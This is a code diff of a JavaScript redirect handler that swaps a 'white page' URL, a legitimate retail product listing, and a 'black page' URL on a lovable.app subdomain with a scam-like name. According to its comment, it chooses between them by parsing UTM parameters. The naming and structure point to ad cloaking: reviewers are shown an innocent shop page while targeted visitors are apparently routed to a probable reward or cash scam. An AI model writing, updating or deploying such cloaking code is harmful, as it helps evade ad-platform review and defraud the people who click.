@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.agjeans.com/collections/womens-jackets-and-outerwear/products/molly-suede-jacket-suede-fringed-trucker-jacket-lxs4762tfee";
-    const blackPageURL = "https://apppplerewad.lovable.app/";
+    const whitePageURL = "https://www.otto.de/p/tillvex-feldbett-campingbett-280kg-campingliege-klappbar-sonnenliege-feldbett-campingbett-klappbar-mit-tragetasche-nackenkissen-bis-280-kg-klappbett-gaestebett-faltbar-garten-camping-festival-reise-S0SD30JB/?variationId=S0SD30JB8VZM";
+    const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
